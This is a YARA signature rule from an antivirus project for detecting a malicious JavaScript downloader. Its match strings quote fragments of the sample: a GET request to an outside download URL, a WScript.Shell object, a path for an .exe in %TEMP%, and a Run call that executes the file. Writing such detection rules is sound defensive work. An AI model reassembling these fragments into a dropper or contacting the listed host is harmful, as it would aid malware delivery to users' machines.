rule sig_20160328_27477da4895126238d32d29104ae5492 {
  meta:
    description = "datamaliciousorder - file 20160328_27477da4895126238d32d29104ae5492.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "9f1e9cb5b041a9c3c0228df18a7f807dc43270eeab369c7a92d7d7b1768014de"

  strings:
    $s1  = "function Umdqhb() {return Cwzzlcutc[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"PvLI2OfNanN4LwQR.exe\";};" fullword ascii
    $s2  = "do {WScript[Zmelrtji](Qlxyggu() * 11)} while (Bvaof[\"readystate\"] < 4 );" fullword ascii
    $s3  = "function Lnhzdofyb(Nwgeeke, Gugfkm){return Nwgeeke - Gugfkm;};" fullword ascii
    $s4  = "Bvaof[Cgrbjc](\"GET\", \"http://www.creative-drumschool.de/p3isakd\", false);" fullword ascii
    $s5  = "var Cwzzlcutc = function Hzpmo() {return WScript[Vzipvn](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Etupgqnguj() {return ((Bgqytmry == true) && (Bgqytmry == Fcerdvo)) ? 1 : Iaeseaxw;};" fullword ascii
    $s7  = "var Bgqytmry = false;" fullword ascii
    $s8  = "var Xblwet = new this[\"Date\"]();" fullword ascii
    $s9  = "Fcerdvo = true; " fullword ascii
    $s10 = "function Hxsecr(){return Vzipvn;};" fullword ascii
    $s11 = "function Atgfv()" fullword ascii
    $s12 = " while (Eetmkeavsc){" fullword ascii
    $s13 = "return Lnhzdofyb(Yxkkykqkn, Xfqvtfp);" fullword ascii
    $s14 = "function Qlxyggu(){return 22;};" fullword ascii
    $s15 = "var Fcerdvo = false;" fullword ascii
    $s16 = "function Myfuq(Itagemfbh) {var Xuhoivgd = (1, 2, 3, 4, 5, Itagemfbh); return Xuhoivgd;};" fullword ascii
    $s17 = "Bgqytmry = true; " fullword ascii
    $s18 = "function Orehw(){return Mbyow;};" fullword ascii
    $s19 = "var Lrawkowb = false;" fullword ascii
    $s20 = "function Cacgbyxb(Vnicbd){Cwzzlcutc[\"Run\"](Vnicbd, Iaeseaxw, Iaeseaxw);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}